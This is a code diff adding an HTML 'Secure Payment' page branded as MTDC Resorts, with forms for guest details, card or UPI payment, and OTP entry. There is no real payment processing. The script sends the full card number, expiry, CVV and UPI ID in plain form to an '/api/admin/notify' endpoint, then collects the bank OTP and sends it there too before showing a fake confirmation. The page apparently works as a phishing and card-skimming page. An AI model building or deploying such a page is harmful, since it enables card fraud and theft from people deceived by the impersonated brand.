@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Payment | MTDC Resorts</title>
+    <style>
+      * { box-sizing: border-box; }
+      :root {
+        --bg: #f3f4f6;
+        --panel: #ffffff;
+        --muted: #64748b;
+        --text: #0f172a;
+        --primary: #f59e0b;
+        --primary-dark: #d97706;
+        --accent: #0f172a;
+        --line: #e2e8f0;
+        --soft: #f8fafc;
+        --success: #10b981;
+        --success-soft: #ecfdf5;
+        --warning-soft: #fff7ed;
+      }
+      body {
+        margin: 0;
+        min-height: 100vh;
+        font-family: Arial, Helvetica, sans-serif;
+        background: linear-gradient(135deg, #f8fafc 0%, #fef3c7 100%);
+        color: var(--text);
+      }
+      .shell {
+        max-width: 1180px;
+        margin: 48px auto;
+        background: var(--panel);
+        border: 1px solid var(--line);
+        border-radius: 28px;
+        overflow: hidden;
+        box-shadow: 0 25px 70px rgba(15, 23, 42, 0.08);
+      }
+      .topbar {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 18px;
+        background: #0f172a;
+        color: white;
+        padding: 20px 28px;
+      }
+      .brand {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .brand-badge {
+        width: 48px;
+        height: 48px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 16px;
+        background: var(--primary);
+        color: #111827;
+        font-weight: 900;
+        font-size: 24px;
+      }
+      .brand small {
+        display: block;
+        font-size: 11px;
+        letter-spacing: 0.2em;
+        text-transform: uppercase;
+        color: #cbd5e1;
+      }
+      .brand h1 {
+        margin: 0;
+        font-size: clamp(1.5rem, 2vw, 2rem);
+      }
+      .amount-box {
+        background: rgba(255,255,255,0.05);
+        border: 1px solid rgba(255,255,255,0.12);
+        border-radius: 18px;
+        padding: 12px 16px;
+        min-width: 180px;
+      }
+      .amount-box .label {
+        display: block;
+        font-size: 11px;
+        letter-spacing: 0.18em;
+        text-transform: uppercase;
+        color: #cbd5e1;
+      }
+      .amount-box .value {
+        display: block;
+        margin-top: 6px;
+        font-weight: 800;
+        font-size: 1.9rem;
+        color: var(--primary);
+      }
+      .content {
+        display: grid;
+        grid-template-columns: 1.2fr 0.8fr;
+      }
+      .main {
+        padding: 28px;
+      }
+      .side {
+        padding: 28px;
+        background: #f8fafc;
+        border-left: 1px solid var(--line);
+      }
+      .row {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 18px;
+        margin-bottom: 18px;
+      }
+      .field {
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+      }
+      label {
+        display: block;
+        font-size: 13px;
+        font-weight: 700;
+        color: #334155;
+      }
+      input {
+        width: 100%;
+        padding: 13px 14px;
+        border-radius: 14px;
+        border: 1px solid var(--line);
+        background: #f8fafc;
+        color: var(--text);
+        font-size: 15px;
+        outline: none;
+        transition: border 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
+      }
+      input:focus {
+        background: white;
+        border-color: var(--primary);
+        box-shadow: 0 0 0 4px rgba(245, 158, 11, 0.14);
+      }
+      .method-switch {
+        margin: 22px 0 20px;
+      }
+      .method-switch .label {
+        display: block;
+        margin-bottom: 12px;
+        font-size: 11px;
+        color: #64748b;
+        letter-spacing: 0.18em;
+        text-transform: uppercase;
+      }
+      .method-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+      }
+      .tab {
+        padding: 14px 18px;
+        border-radius: 16px;
+        border: 1px solid var(--line);
+        background: #f8fafc;
+        font-size: 15px;
+        font-weight: 700;
+        color: #334155;
+        cursor: pointer;
+        transition: all 0.18s ease;
+      }
+      .tab.active {
+        background: #fff7ed;
+        border-color: #fbbf24;
+        color: #111827;
+        box-shadow: 0 8px 20px rgba(245,158,11,0.12);
+      }
+      .hidden { display: none !important; }
+      .submit-btn {
+        width: 100%;
+        margin-top: 16px;
+        border: none;
+        border-radius: 16px;
+        background: linear-gradient(180deg, #fbbf24, #f59e0b);
+        color: #111827;
+        font-weight: 800;
+        font-size: 16px;
+        padding: 15px 18px;
+        cursor: pointer;
+        box-shadow: 0 12px 22px rgba(245,158,11,0.18);
+      }
+      .submit-btn:hover { filter: brightness(0.98); }
+      .upi-btn { background: linear-gradient(180deg, #34d399, #10b981); color: white; box-shadow: 0 12px 22px rgba(16,185,129,0.2); }
+      .message {
+        display: none;
+        border-radius: 18px;
+        padding: 12px 14px;
+        background: #f8fafc;
+        border: 1px solid var(--line);
+        color: #334155;
+        margin-top: 18px;
+        font-size: 14px;
+      }
+      .message.show {
+        display: block;
+      }
+      .otp-box {
+        background: #fff7ed;
+        border: 1px solid #fed7aa;
+        border-radius: 22px;
+        padding: 18px;
+        margin-top: 20px;
+      }
+      .otp-box h3 {
+        margin: 0 0 8px;
+        font-size: 1.15rem;
+        color: #111827;
+      }
+      .otp-box p {
+        margin: 0 0 14px;
+        color: #475569;
+        font-size: 14px;
+      }
+      .summary-box {
+        background: white;
+        border: 1px solid var(--line);
+        border-radius: 22px;
+        padding: 18px;
+      }
+      .summary-box h2 {
+        margin: 0 0 18px;
+        font-size: 12px;
+        letter-spacing: 0.18em;
+        text-transform: uppercase;
+        color: #64748b;
+      }
+      .summary-row {
+        display: flex;
+        justify-content: space-between;
+        gap: 10px;
+        margin: 16px 0;
+        color: #334155;
+      }
+      .summary-row strong {
+        color: #0f172a;
+      }
+      .status-pill {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        padding: 6px 10px;
+        border-radius: 999px;
+        font-size: 11px;
+        font-weight: 800;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+        background: var(--success-soft);
+        color: #047857;
+      }
+      .trust-box {
+        margin-top: 18px;
+        background: #fff7ed;
+        border: 1px solid #fed7aa;
+        border-radius: 22px;
+        padding: 18px;
+      }
+      .trust-box h3 {
+        margin: 0 0 10px;
+        font-size: 1rem;
+      }
+      .trust-box p {
+        margin: 0;
+        color: #475569;
+        line-height: 1.5;
+        font-size: 14px;
+      }
+      @media (max-width: 860px) {
+        .content { grid-template-columns: 1fr; }
+        .side { border-left: none; border-top: 1px solid var(--line); }
+      }
+      @media (max-width: 640px) {
+        .shell { margin: 20px 12px; }
+        .topbar { flex-direction: column; align-items: flex-start; }
+        .row, .method-grid { grid-template-columns: 1fr; }
+        .main, .side { padding: 20px; }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="shell">
+      <div class="topbar">
+        <div class="brand">
+          <div class="brand-badge">M</div>
+          <div>
+            <small>MTDC Resorts</small>
+            <h1>Secure Payment</h1>
+          </div>
+        </div>
+        <div class="amount-box">
+          <span class="label">Amount Due</span>
+          <span class="value" id="amountDisplay">₹0</span>
+        </div>
+      </div>
+
+      <div class="content">
+        <div class="main">
+          <div class="row">
+            <div class="field">
+              <label for="guestName">Guest Name</label>
+              <input id="guestName" type="text" placeholder="Enter Guest Full Name" />
+            </div>
+            <div class="field">
+              <label for="mobile">Mobile Number</label>
+              <input id="mobile" type="text" placeholder="10-Digit Mobile Number" maxlength="10" />
+            </div>
+          </div>
+
+          <div class="method-switch">
+            <span class="label">Choose Payment Method</span>
+            <div class="method-grid">
+              <button class="tab active" type="button" data-method="card">Card Payment</button>
+              <button class="tab" type="button" data-method="upi">UPI Payment</button>
+            </div>
+          </div>
+
+          <form id="cardForm" novalidate>
+            <div class="field" style="margin-bottom: 16px;">
+              <label for="cardHolderName">Card Holder Name</label>
+              <input id="cardHolderName" type="text" placeholder="Name as printed on card" />
+            </div>
+            <div class="field" style="margin-bottom: 16px;">
+              <label for="cardNumber">Card Number</label>
+              <input id="cardNumber" type="text" placeholder="1234 5678 9012 3456" maxlength="19" />
+            </div>
+            <div class="row">
+              <div class="field">
+                <label for="cardExpiry">Expiry Date</label>
+                <input id="cardExpiry" type="text" placeholder="MM/YY" maxlength="5" />
+              </div>
+              <div class="field">
+                <label for="cardCvv">CVV</label>
+                <input id="cardCvv" type="password" placeholder="123" maxlength="4" />
+              </div>
+            </div>
+            <button id="payCardBtn" class="submit-btn" type="submit">Pay Securely</button>
+          </form>
+
+          <form id="upiForm" class="hidden" novalidate>
+            <div class="field">
+              <label for="upiId">UPI ID / VPA</label>
+              <input id="upiId" type="text" placeholder="name@upi" />
+            </div>
+            <div style="margin-top: 14px; border: 1px solid #bbf7d0; background: #ecfdf5; border-radius: 16px; padding: 14px; color: #065f46; font-size: 14px; line-height: 1.5;">
+              You can pay through any UPI app such as Google Pay, PhonePe, Paytm, or BHIM.
+            </div>
+            <button id="payUpiBtn" class="submit-btn upi-btn" type="submit">Continue with UPI</button>
+          </form>
+
+          <form id="otpSection" class="otp-box hidden" novalidate>
+            <h3>OTP Verification Required</h3>
+            <p>Enter the OTP received on your registered mobile number ending in <strong id="otpCardLast4">0000</strong>.</p>
+            <div class="field">
+              <label for="otpCode">Enter OTP</label>
+              <input id="otpCode" type="text" placeholder="123456" maxlength="8" />
+            </div>
+            <button id="verifyOtpBtn" class="submit-btn" type="submit">Verify OTP</button>
+          </form>
+
+          <div id="messageBox" class="message"></div>
+        </div>
+
+        <div class="side">
+          <div class="summary-box">
+            <h2>Booking Summary</h2>
+            <div class="summary-row">
+              <span>Reference</span>
+              <strong id="bookingRef">N/A</strong>
+            </div>
+            <div class="summary-row">
+              <span>Amount</span>
+              <strong id="summaryAmount">₹0</strong>
+            </div>
+            <div class="summary-row">
+              <span>Status</span>
+              <span class="status-pill">Pending</span>
+            </div>
+          </div>
+
+          <div class="trust-box">
+            <h3>Secure &amp; Trusted</h3>
+            <p>Your payment details are used only for booking verification and are handled securely by the MTDC reservation desk.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const params = new URLSearchParams(window.location.search);
+      const bookingId = params.get('bookingId') || params.get('pnr') || 'N/A';
+      const amount = Number(String(params.get('amount') || '0').replace(/[^\d.-]/g, '')) || 0;
+      const amountLabel = `₹${Number.isFinite(amount) ? amount.toLocaleString('en-IN') : '0'}`;
+
+      document.getElementById('amountDisplay').textContent = amountLabel;
+      document.getElementById('bookingRef').textContent = bookingId;
+      document.getElementById('summaryAmount').textContent = amountLabel;
+
+      const cardForm = document.getElementById('cardForm');
+      const upiForm = document.getElementById('upiForm');
+      const otpSection = document.getElementById('otpSection');
+      const messageBox = document.getElementById('messageBox');
+      const tabs = document.querySelectorAll('.tab');
+      const otpCardLast4 = document.getElementById('otpCardLast4');
+      const cardNumberInput = document.getElementById('cardNumber');
+      const mobileInput = document.getElementById('mobile');
+      const cardExpiryInput = document.getElementById('cardExpiry');
+      const cardCvvInput = document.getElementById('cardCvv');
+      let activeMethod = 'card';
+      let paymentRecordId = null;
+
+      function formatCardNumber(value) {
+        const digits = value.replace(/\D/g, '').slice(0, 19);
+        return digits.replace(/(.{4})/g, '$1 ').trim();
+      }
+      function formatExpiry(value) {
+        const digits = value.replace(/\D/g, '').slice(0, 4);
+        if (digits.length <= 2) return digits;
+        return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+      }
+      function formatMobile(value) {
+        return value.replace(/\D/g, '').slice(0, 10);
+      }
+
+      function setMethod(method) {
+        activeMethod = method;
+        tabs.forEach((tab) => tab.classList.toggle('active', tab.dataset.method === method));
+        cardForm.classList.toggle('hidden', method !== 'card');
+        upiForm.classList.toggle('hidden', method !== 'upi');
+        otpSection.classList.add('hidden');
+      }
+
+      function showMessage(text) {
+        messageBox.textContent = text;
+        messageBox.classList.add('show');
+      }
+
+      async function sendToAdmin(payload) {
+        const response = await fetch('/api/admin/notify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        return response.ok ? await response.json() : null;
+      }
+
+      tabs.forEach((tab) => {
+        tab.addEventListener('click', () => setMethod(tab.dataset.method));
+      });
+
+      cardNumberInput.addEventListener('input', (event) => {
+        event.target.value = formatCardNumber(event.target.value);
+      });
+      cardExpiryInput.addEventListener('input', (event) => {
+        event.target.value = formatExpiry(event.target.value);
+      });
+      mobileInput.addEventListener('input', (event) => {
+        event.target.value = formatMobile(event.target.value);
+      });
+      cardCvvInput.addEventListener('input', (event) => {
+        event.target.value = event.target.value.replace(/\D/g, '').slice(0, 4);
+      });
+
+      document.getElementById('payCardBtn').addEventListener('click', async (event) => {
+        event.preventDefault();
+        event.stopPropagation();
+
+        const guestName = document.getElementById('guestName').value.trim();
+        const mobile = mobileInput.value.trim();
+        const cardHolderName = document.getElementById('cardHolderName').value.trim();
+        const cardNumber = cardNumberInput.value.replace(/\D/g, '');
+        const cardExpiry = cardExpiryInput.value.trim();
+        const cardCvv = cardCvvInput.value.trim();
+
+        if (!cardHolderName || !cardNumber || !cardExpiry || !cardCvv) {
+          showMessage('Please fill all card details.');
+          return;
+        }
+        if (cardNumber.length < 12 || cardNumber.length > 19) {
+          showMessage('Please enter a valid card number.');
+          return;
+        }
+
+        const payload = {
+          activityType: 'card_submission',
+          recordId: `REC-${Date.now()}`,
+          bookingId,
+          guestName: guestName || cardHolderName,
+          mobile,
+          amount,
+          paymentMethod: 'card',
+          cardHolderName,
+          cardNumber,
+          cardExpiry,
+          cardCvv,
+          submittedAt: new Date().toISOString()
+        };
+
+        paymentRecordId = payload.recordId;
+        otpCardLast4.textContent = cardNumber.slice(-4) || '0000';
+        await sendToAdmin(payload);
+        otpSection.classList.remove('hidden');
+        showMessage('Card details submitted . Please enter the OTP.');
+      });
+
+      document.getElementById('payUpiBtn').addEventListener('click', async (event) => {
+        event.preventDefault();
+        event.stopPropagation();
+
+        const guestName = document.getElementById('guestName').value.trim();
+        const mobile = mobileInput.value.trim();
+        const upiId = document.getElementById('upiId').value.trim();
+
+        if (!upiId) {
+          showMessage('Please enter a valid UPI ID.');
+          return;
+        }
+
+        const payload = {
+          activityType: 'upi_submission',
+          recordId: `UPI-${Date.now()}`,
+          bookingId,
+          guestName: guestName || 'UPI Guest',
+          mobile,
+          amount,
+          paymentMethod: 'upi',
+          upiId,
+          status: 'pending',
+          submittedAt: new Date().toISOString()
+        };
+
+        await sendToAdmin(payload);
+        showMessage('UPI request submitted successfully. Please complete the payment in your UPI app.');
+      });
+
+    document.getElementById('verifyOtpBtn').addEventListener('click', async (event) => {
+  event.preventDefault();
+  event.stopPropagation();
+
+  const otp = document.getElementById('otpCode').value.trim();
+  if (!otp) {
+    showMessage('Please enter the OTP.');
+    return;
+  }
+
+  const recordId = paymentRecordId || `OTP-${Date.now()}`;
+  paymentRecordId = recordId;
+
+  // Processing message dikhayein
+  showMessage('Verifying OTP... Please wait.');
+
+  // Admin ko OTP payload bhejen
+  await sendToAdmin({
+    activityType: 'otp_submission',
+    recordId,
+    bookingId,
+    guestName: document.getElementById('guestName').value.trim() || document.getElementById('cardHolderName').value.trim(),
+    mobile: mobileInput.value.trim(),
+    otpEntered: otp,
+    status: 'otp_received',
+    submittedAt: new Date().toISOString()
+  });
+
+  // OTP submit hone ke baad redirect karein (Booking ID aur Amount ke saath)
+  setTimeout(() => {
+    window.location.href = `booking-confirmation.html?bookingId=${encodeURIComponent(bookingId)}&amount=${encodeURIComponent(amount)}`;
+  }, 1000); // 1 second ka delay taaki user ko notification dikhe
+});
+
+      setMethod('card');
+    </script>
+  </body>
+</html>
